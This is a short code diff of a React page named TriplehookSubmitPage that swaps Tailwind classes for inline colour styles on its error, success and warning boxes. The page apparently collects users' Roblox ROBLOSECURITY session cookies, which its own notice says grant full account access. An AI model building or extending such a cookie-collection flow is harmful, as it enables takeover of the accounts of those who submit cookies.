@@ -127,14 +127,14 @@ export default function TriplehookSubmitPage() {
                 </div>
 
                 {error && (
-                  <div className="flex gap-3 p-4 bg-error/10 border border-error/50 rounded-lg">
+                  <div className="flex gap-3 p-4 rounded-lg" style={{backgroundColor: 'rgba(239, 68, 68, 0.1)', borderColor: 'rgba(239, 68, 68, 0.5)'}}>
                     <AlertCircle className="w-5 h-5 text-error flex-shrink-0 mt-0.5" />
                     <div className="text-error text-sm">{error}</div>
                   </div>
                 )}
 
                 {success && (
-                  <div className="flex gap-3 p-4 bg-success/10 border border-success/50 rounded-lg">
+                  <div className="flex gap-3 p-4 rounded-lg" style={{backgroundColor: 'rgba(16, 185, 129, 0.1)', borderColor: 'rgba(16, 185, 129, 0.5)'}}>
                     <CheckCircle className="w-5 h-5 text-success flex-shrink-0 mt-0.5" />
                     <div className="text-success text-sm">Cookie processed successfully! Redirecting...</div>
                   </div>
@@ -181,7 +181,7 @@ export default function TriplehookSubmitPage() {
                 </ol>
               </div>
 
-              <div className="card-base rounded-xl border border-warning/50 bg-warning/5">
+              <div className="card-base rounded-xl" style={{borderColor: 'rgba(245, 158, 11, 0.5)', backgroundColor: 'rgba(245, 158, 11, 0.05)'}}>
                 <h4 className="font-semibold text-warning mb-2">Security Notice</h4>
                 <p className="text-sm text-muted-foreground">
                   Never share your ROBLOSECURITY cookie with untrusted sources. This cookie grants full access to your Roblox account.
